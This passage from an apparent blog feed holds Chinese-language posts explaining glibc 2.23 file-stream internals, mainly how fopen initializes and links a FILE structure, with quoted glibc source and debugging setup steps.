count;后，最后如果大小小于4k会和上面小于4k一样先进入缓冲区再读入第一个参数内存里</p><h2 id="函数中调用的vtable函数"><a href="#函数中调用的vtable函数" class="headerlink" title="函数中调用的vtable函数"></a>函数中调用的vtable函数</h2><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fopen</title>
      <link href="/2023/03/30/IO-FILE-fopen/"/>
      <url>/2023/03/30/IO-FILE-fopen/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>glibc2.23</p><p>下载对应版本Ubuntu glibc源码 <a href="https://launchpad.net/ubuntu/+source/glibc/">https://launchpad.net/ubuntu/+source/glibc/</a></p><p>或者</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt-get install glibc-source</span><br><span class="line">sudo apt-get install libc6-dbg</span><br><span class="line">sudo apt-get install libc6-dbg:i386</span><br><span class="line">到/usr/src/glibc</span><br></pre></td></tr></table></figure><p>在.gdbinit里写入dir path进行源码级调试,也可以直接在gdb里dir path</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;include&#x2F;stdio.h</strong></p><p>找到了fopen的macro</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;iofopen.c</strong></p><p>_IO_new_fopen直接调用__fopen_internal</p><p><strong>_IO_new_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>__fopen_internal</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;          <span class="comment">//为多线程(Multithreading)io安全准备的锁</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>先用malloc分配了locked_FILE类型的结构体new_f</li><li><code>_IO_no_init</code>进行初始化 _IO_FILE_plus fp</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表</li><li><code>_IO_file_fopen</code>执行系统调用打开文件</li></ol><h3 id="IO-no-init进行初始化-IO-FILE-plus-fp"><a href="#IO-no-init进行初始化-IO-FILE-plus-fp" class="headerlink" title="_IO_no_init进行初始化 _IO_FILE_plus fp"></a><code>_IO_no_init</code>进行初始化 _IO_FILE_plus fp</h3><p><strong>_IO_no_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (_IO_FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">         <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调用_IO_old_init 设置flags，其余NULL初始化fp</p><p><strong>_IO_old_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (_IO_FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</code></p><p>再把<code>_wide_data</code>字段赋值并初始化fp-&gt;_wide_data-&gt;_wide_vtabl为_IO_wfile_jumps</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230330202938679.png" alt="image-20230330202938679"></p><h3 id="IO-file-init将结构体链接进-IO-list-all链表"><a href="#IO-file-init将结构体链接进-IO-list-all链表" class="headerlink" title="_IO_file_init将结构体链接进_IO_list_all链表"></a><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表</h3><p>回到<code>__fopen_internal</code>先执行<code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(*THIS*) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><blockquote><p><code>*THIS*</code> 是一个指针参数，它用来表示传入宏定义的结构体指针。</p><p>在宏定义展开时，参数 <code>THIS</code> 会被替换为传入的结构体指针。而 <code>*THIS*</code> 中的星号 <code>*</code> 没有实际的作用，只是为了标识 <code>THIS</code> 是一个指针类型的参数。这样做的目的是为了方便理解宏定义的作用，明确参数类型，增加代码的可读性。</p></blockquote><p>把fp的vtable设置为_IO_file_jumps地址</p><p><strong>&#x2F;libio&#x2F;fileops.c</strong> </p><p><strong>_IO_new_file_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;genops.c</strong> </p><p><strong>_IO_link_in</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>_IO_LINKED标志位用来指示一个streambuf对象是否已经被添加到了_list_all链表中。</p><p>如果一个streambuf对象链接到了_IO_list_all链表，则_IO_LINKED标志位会被设置为1，否则为0</p></blockquote><p>fp-&gt;file._flags &amp; _IO_LINKED检测到为0则设置为1并把_chain设置为当前_IO_list_all，把_IO_list_all设置为当前_IO_FILE_plus</p><h3 id="IO-file-fopen执行系统调用打开文件"><a href="#IO-file-fopen执行系统调用打开文件" class="headerlink" title="_IO_file_fopen执行系统调用打开文件"></a><code>_IO_file_fopen</code>执行系统调用打开文件</h3><p>回到__fopen_internal，调用_IO_file_fopen</p><p><strong>libio&#x2F;fileops.c</strong></p><p><strong>_IO_file_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">            <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    #define _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br><span class="line"><span class="comment">    先检测了文件是不是打开，打开直接返回</span></span><br><span class="line"><span class="comment">    在_IO_new_file_init** 设置了fp-&gt;file._fileno = -1;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据我们fopen的mode设置文件打开模式</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      omode = O_RDWR;</span><br><span class="line">      read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      oflags |= O_EXCL;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> O_CLOEXEC</span></span><br><span class="line">      oflags |= O_CLOEXEC;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      满足一下其他组合mode 如r+ rw+ a+ wb等</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Ignore.  */</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">              is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      .....................</span><br><span class="line">          .....................</span><br><span class="line">          .....................</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用</p><p><strong>_IO_file_open</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line">           <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">     </span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">                 posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      </span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">    &#123;</span><br><span class="line">      close_not_cancel (fdesc);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用系统函数open打开文件</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230331133757733.png" alt="image-20230331133757733"></p><p>,把返回值给到_fileno字段，再次<code>_IO_link_in</code>函数加入<code>_IO_list_all</code>链表</p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE</title>
      <link href="/2023/03/29/IO-FILE/"/>
      <url>/2023/03/29/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>最初学习c语言的时候，我们经常会用fopen打开一些文件来操作</p><p><code>FILE *fopen(const char *filename, const char *mode)</code></p><p>返回一个FILE文件指针，这个FILE到底是什么呢?他的底层数据结构什么样子?都有什么用呢?我们经常用的io函数又和这个有什么关系呢?</p><h2 id="What-is-FILE"><a href="#What-is-FILE" class="headerlink" title="What is FILE??"></a>What is FILE??</h2><p>看一下源码 <code>libio/libioP.h</code>中</p><p><code>typedef struct _IO_FILE FILE;</code></p><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t 